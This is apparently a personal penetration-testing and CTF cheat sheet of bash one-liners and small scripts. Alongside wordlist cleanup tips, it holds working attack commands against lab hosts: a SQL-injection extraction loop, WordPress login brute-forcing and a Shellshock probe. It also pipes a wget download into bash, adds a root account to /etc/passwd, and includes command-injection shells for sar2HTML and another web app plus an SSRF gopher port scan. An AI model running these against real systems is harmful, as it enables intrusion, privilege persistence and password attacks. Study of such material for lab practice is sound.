## BASH TRICKS

## bash tricks
```bash
`command`

$(command)

${IFS} = space 			to do fast  - echo 'ping -c 1 10.10.14.6'| sed 's/ /${IFS}/g'

{echo,test}  = , means space

```


### Bad inter error
```bash

sed -i -e 's/\r$//' file

```
### To remove space from wordlist 
```bash
  sed 's/[[:space:]]//g' input.txt > no-spaces.txt
```

### wordlist to remove all none compatible WPA word-lengths (8-63)
```bash
cat yourwordlistfile | pw-inspector -m 8 -M 30 > yournewfile
```
> This will cut out all words that are NOT 8 - 30 letters in length and put them in "yournewfile". I know the max WPA length is 63 but 30 is more realistic for a potential password


### To remove all html ****, white space and none alphanumeric entries i.e. !"!Â£"$%$$%^&*&(*)()_+><? (I would run this first)
```bash
cat wordlistfile | sed 's/[^a-zA-Z0-9]//g' > newfile
```

### To convert all to lowercase
```bash
tr '[:upper:]' '[:lower:]' < inputfile > outputfile 
```

### Vim
```bash
vim user.txt 	#	(We can create a way of creating username will recording and can apply it to the other user)

	qa	# (It will start recording)
	q	# (It will stop recoeding)
	@a	# (It will paste according to the recording)

 	%s/ $//g	# (To remove space at end of the line)
```

## Nmap result 
```bash

cat ports.txt| awk -F/ '{print $1}' ORS=','

cat nmap.txt | grep open | awk '{print $1}' ORS=','

```

## Capturing packets live through ssh 
tags:- #SSH

```bash

ssh 10.10.14.6@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22'"  | wireshark -k -i -

```

## To search for online hosts through ping 
tags:- #PING
```bash
for i in {1..255}; do ping -c 1 10.120.15.$i | grep "bytes from" | cut -d " " -f4 | cut -d ":" -f1 ; done
```

## To do Sql Automate 
tags:- #SQL-I
```bash

for i in {1..90}; do curl "http://192.168.5.106/index.php" -d "option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema = database() limit $i,1)))" -s | grep -A3 blockquote | grep "#__" ; done

```

## wp-login.php Brute Force

```bash
# With the Wfuzz

wfuzz -c -z file,pass.txt  -d "log=jens&pwd=FUZZ&wp-submit=Log In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1" -b "wordpress_test_cookie=WP+Cookie+check" --hs 'incorrect' http://wordy/wp-login.php

ffuf -c -w ~/wordlist/rockyou.txt -X POST -H "Content-Type: application/x-www-form-urlencoded"   -d "log=kwheel&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1" -b "wordpress_test_cookie=WP+Cookie+check" -fr 'incorrect' -u  http://blog.thm/wp-login.php

```

## Shellshock Testing 
```bash

curl -H "User-agent:  () { :;}; echo; echo vulnerable" http://192.168.5.144/cgi-bin/test.sh

```

## wget
tags:-  #WGET

```bash
# To run command while downloading 

wget -qO - http://example.com/script.sh | bash

```

## To convert txt to json	
```jq

jq -s -R '[[ split("\n")[] | select(length > 0) | split(": +";"") | {(.[0]): .[1]}] | add]' exp.txt > exp.js

```

## Image CTF
```bash
# To extract the hidden message or file

steghide extract -sf HackerAccessGranted.jpg


```

## openssl enc'd 
```bash
openssl passwd sha

> 55I2zrL55mI3g
```
## New superuser(root)
```
echo 'sha:55I2zrL55mI3g:0:0:sha:/root:/bin/bash' >> /etc/passwd 
```
> $S$5igiyXY.3jqeB2QvRNuI6BgqJAgjWVh3aPNW9FvIkS/60e1XMncz   -  sha in drupal 8 and new version

## Hashcat 
```bash

hashcat --examples-hashes | grep -B2 '\$1\$'

```



# ***SCRIPTS***

## bash eg: 1
```bash
while true ; do
		
	echo "the cmd"
	
	read cmd
		
	result= curl -i -s http://192.168.5.151:7331/wish -d "cmd=$cmd" | grep Location | awk -F\= '{print $2}' | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' |  xargs echo -e | sed -e 's/+/ /g'
		
	echo $result


done
```

## bash eg: 2
```bash
while true; do

	echo "The Command"
	
	read cmd
	
	t=$(echo -n "$cmd" | base64)
	
	curl -s "http://192.168.5.152/sar2HTML/index.php?plot=;echo+$t+|+base64+-d|bash" | grep value | sed 's/value/\n/g' | grep option | awk -F '>' '{print $1}'
	
done
```


## bash eg: 3 For Port scan in ssrf vulnerability
```bash 

#!/bin/bash

for i in `cat port.txt`; do 
	a=`timed-run 1 curl -s "http://quic.nagini.hogwarts/internalResourceFeTcher.php?url=gopher://127.0.0.1:$i/"| wc -l`
	if [[ $a -lt 5  ]] 
	then 
		echo "test $i"
	fi
done
```

















## Compiler for .c

- Intel C++ Compiler
- GNU Compiler
- Dev C++
- Borland C++
- Clang
- Visual C++ Compiler
- MinGW
- Tiny C Compiler




## Curl 
tags:- #CURL

```bash
# TO find PhpMyAdmin Version

curl -s http://192.168.5.169/phpmyadmin | grep -E -o 'PMA_VERSION:"[[:digit:].]+"'

```



## ffuf 
tags:- #ffuf
```bash

ffuf -u https://google.com -w dns_dict.txt -mc 200 -H "HOST: FUZZ.google.com"

ffuf -u http://driftingblues.box -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -H "HOST: FUZZ.driftingblues.box" -t 200 -fw 2259

```
















## Cleaning


Simply run the following command to cleanup the /var/log/journal directory:
```bash
journalctl --vacuum-size=500M
# Code language: Bash (bash)
```

This will delete old log files until the directory reaches the threshold size stipulated, in our case, 500M.



## Unstable version of RUST

Rust is installed now. Great!

> To get started you may need to restart your current shell.
This would reload your PATH environment variable to include
Cargo's bin directory ($HOME/.cargo/bin).

To configure your current shell, run:

> source $HOME/.cargo/env
